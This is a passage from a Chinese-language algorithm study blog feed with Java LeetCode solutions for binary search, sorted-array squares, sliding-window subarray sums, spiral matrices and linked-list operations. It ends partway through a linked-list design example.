      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x1/</url>
      
        <content type="html"><![CDATA[<h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>link：<a href="https://leetcode.cn/problems/binary-search/description/">704. 二分查找 - 力扣（LeetCode）</a><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240923152617533.png" alt="image-20240923152617533"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出数组升序 ，想到二分查找（好吧其实题目也给出来了w）<br>找到mid，根据逻辑大小缩小范围比较.</p><h6 id="全包围-lefg-right"><a href="#全包围-lefg-right" class="headerlink" title="全包围[lefg,right]"></a>全包围[lefg,right]</h6><p>假如数组大小为6，取值范围就是[0,5].闭区间使得定义left &#x3D; 0，right &#x3D; nums.length-1（防止越界指针无效，也是根据此处可以反推没有左开右闭情况）<br>left指针是0.right是5，这个时候left &#x3D;&#x3D; right是有效的，结束条件也就是left&lt;&#x3D;right，再根据mid位置进行判断，target是再mid左边还是右边或者是幸运的查找到目标位置.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//看到数组习惯性反应越界问题</span></span><br><span class="line">        <span class="comment">//闭区间</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="左闭右开-left-rigjht"><a href="#左闭右开-left-rigjht" class="headerlink" title="左闭右开[left,rigjht)"></a>左闭右开[left,rigjht)</h6><p>同样的条件但是right指针指向nums.length，对应的left &#x3D;&#x3D; right没有意义.所以判断条件是left &lt; right.如果target在nums[mid]左边的话，把left赋值为mid+1，但是反过来<strong>target在nums[mid]右边的话，就要赋值left为mid</strong>【右边开mid指的指针不参加下一次循环判读】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="全开-left-right"><a href="#全开-left-right" class="headerlink" title="全开(left,right)"></a>全开(left,right)</h6><p>分析同上述 只不过全开两种情况都赋值为mid.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left + <span class="number">1</span> &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p><strong>1.区间问题，判断条件是否能遍历所有下标.</strong><br><strong>2.其实将mid取值方法改成left+((right-left)&gt;&gt;1)【和 &#x2F; 2一样】是最好的，直接用（left+right）&#x2F; 2和（left+right）&#x2F;&#x2F; 2 【向下取整】 只适用于少数据全包围情况，此情况left和right都是int范围，取值范围是-2147483648-2147483647，当两个数值很接近边界值的时候相加很容易出现负值</strong><br><strong>3.（right-left ）&#x2F; 2 只是表示了left和right指针之间距离的一半，不能表示mid所在的位置，用left加上距离的一半刚好能进行表示.</strong></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x3</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x3/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x3/</url>
      
        <content type="html"><![CDATA[<h4 id="有序数组的平方"><a href="#有序数组的平方" class="headerlink" title="有序数组的平方"></a>有序数组的平方</h4><p>link：<a href="https://leetcode.cn/problems/squares-of-a-sorted-array/description/">977. 有序数组的平方 - 力扣（LeetCode）</a><br><strong>非递减顺序</strong><br>一个数列中的元素从左到右依次不减，或者说不降序排列.<br>比如：1233445，12345.</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>如果看到数组能条件反射到双指针那已经是win了.<br>根据题意平方之后的数一定在数组的两端.两个指针一首一尾，从后往前更新数组.<br><img src="D:\Users\lenovo\Desktop\无标题-2024-10-02-1521.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortedSquares(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">      <span class="comment">//非递减数组可得最大值平方后会出现在数组两头</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> result.length - <span class="number">1</span> ;</span><br><span class="line">      <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[left]*nums[left] &gt; nums[right]*nums[right]) &#123;</span><br><span class="line">            result[index--] = nums[left] * nums[left++];</span><br><span class="line">           <span class="comment">// left++;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             result[index--] = nums[right] * nums[right--];</span><br><span class="line">            <span class="comment">//right--;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="长度最小的子数组"><a href="#长度最小的子数组" class="headerlink" title="长度最小的子数组"></a>长度最小的子数组</h4><p>link：<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. 长度最小的子数组 - 力扣（LeetCode）</a></p><p><strong>双指针变形——滑动窗口</strong><br>其实也可以理解成给入队的队列一个给定的大小变成窗口，先入队元素，然后和target进行比较，大于等于target就出队先进的元素，再进新元素并且标记好原来大于等于target的数组长度.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//起始位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//滑动窗口值总和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;<span class="comment">//定义最大值 遍历不出错</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt; nums.length;end++) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span>(sum &gt;= target) &#123;</span><br><span class="line">                result = Math.min(result, end - begin + <span class="number">1</span>);<span class="comment">//最小长度</span></span><br><span class="line">                sum -= nums[begin++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span> : result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点：如何移动起始位置</strong><br>如果循环中的标记位在起始位置，起始位置和终止位置都需要移动一遍和暴力解法无差别，所以我们的标记位一定是终止位.</p><h4 id="螺旋矩阵-II"><a href="#螺旋矩阵-II" class="headerlink" title="螺旋矩阵 II"></a>螺旋矩阵 II</h4><p>link：<a href="https://leetcode.cn/problems/spiral-matrix-ii/description/">59. 螺旋矩阵 II - 力扣（LeetCode）</a><br>奇怪的代码掌控力… 主要问题在<strong>边界处理</strong></p><h6 id="顺序解决"><a href="#顺序解决" class="headerlink" title="顺序解决"></a>顺序解决</h6><p>按照本来的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>,r = n - <span class="number">1</span>,t = <span class="number">0</span>,b = n-<span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span>[][] result = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">     <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span> <span class="variable">tar</span> <span class="operator">=</span> n * n;</span><br><span class="line">     <span class="keyword">while</span>(num &lt;= tar) &#123;</span><br><span class="line">     <span class="comment">//第一行开始</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;i &lt;= r;i++)&#123;</span><br><span class="line">        result[t][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     t++;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> t; i &lt;= b; i++)&#123;</span><br><span class="line">        result[i][r] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     r--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r; i &gt;=l; i--)&#123;</span><br><span class="line">        result[b][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     b--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b;i &gt;= t;i--) &#123;</span><br><span class="line">        result[i][l] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     l++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="改编版本"><a href="#改编版本" class="headerlink" title="改编版本"></a>改编版本</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 控制循环次数</span></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 每次循环的开始点(start, start)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// 定义填充数字</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (loop++ &lt; n / <span class="number">2</span>) &#123; <span class="comment">// 判断边界后，loop从1开始</span></span><br><span class="line">            <span class="comment">// 模拟上侧从左到右</span></span><br><span class="line">            <span class="keyword">for</span> (j = start; j &lt; n - loop; j++) &#123;</span><br><span class="line">                res[start][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟右侧从上到下</span></span><br><span class="line">            <span class="keyword">for</span> (i = start; i &lt; n - loop; i++) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟下侧从右到左</span></span><br><span class="line">            <span class="keyword">for</span> (; j &gt;= loop; j--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟左侧从下到上</span></span><br><span class="line">            <span class="keyword">for</span> (; i &gt;= loop; i--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            res[start][start] = count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>1.遇到有序数组考虑二分法.<br>2.双指针（找准循环不变量中的不变量）.<br>3.求连续子数组的总和可用滑动窗口解决.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x4</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x4/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x4/</url>
      
        <content type="html"><![CDATA[<h4 id="移除列表元素"><a href="#移除列表元素" class="headerlink" title="移除列表元素"></a>移除列表元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-linked-list-elements/description/">203. 移除链表元素 - 力扣（LeetCode）</a></p><p>首先单向链表是有一个数据域和指针域且在内存中不连续.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241002232434525.png" alt="image-20241002232434525"><br>链表的查找需要从头往后一个个查找【时间复杂度为O(n)】，但是数组查找只需要访问对应元素下标即可【时间复杂度为O(1)】.<br><strong>查找频繁</strong>：数组是更好的选择，因为通过索引访问的时间复杂度是 O(1)，链表则需要遍历.</p><p><strong>插入&#x2F;删除频繁</strong>：链表更适合，因为它可以高效地插入和删除元素，时间复杂度为 O(1)（假设已找到插入或删除位置）。相反，数组在插入和删除时需要移动大量元素，时间复杂度为 O(n).</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看到题目最第一反应就是常规解法，遍历链表找到target直接进行删除操作.【目标是头节点和不是头节点两种情况】（其实还是想有更优雅的解法 不用单独处理移除头节点的情况）</p><h6 id="直接删除"><a href="#直接删除" class="headerlink" title="直接删除"></a>直接删除</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(head == <span class="literal">null</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(cur.val == val)&#123;</span><br><span class="line">  prev.next = cur.next;</span><br><span class="line">  cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"> prev = cur;</span><br><span class="line"> cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(head.val == val)&#123;</span><br><span class="line">head = head.next;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="comment">//只有头节点</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建虚拟头节点 不用再删除头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(prev != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.val == val) &#123;</span><br><span class="line">                cur.next = prev.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur = prev;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="设计链表"><a href="#设计链表" class="headerlink" title="设计链表"></a>设计链表</h4><p>link：<a href="https://leetcode.cn/problems/design-linked-list/">707. 设计链表 - 力扣（LeetCode）</a></p><p>综合练习链表五大操作的好题目！<br>1.获取链表的index下标节点数值.<br>2.在链表最前面插入节点.<br>3.在链表最后插入节点.<br>4.在链表第index个节点前插入节点.<br>5.删除链表第index个节点. </p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>先从链表需要的元素入手，head，tail，size.<br>考虑虚拟头节点.【优先考虑特殊情况】<br>个人觉得对于单链表更容易操作.(好吧其实就是一个懒蛋😂)</p><h6 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的结构</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(<span class="type">int</span> val) &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">//如果index不在范围返回-1</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) 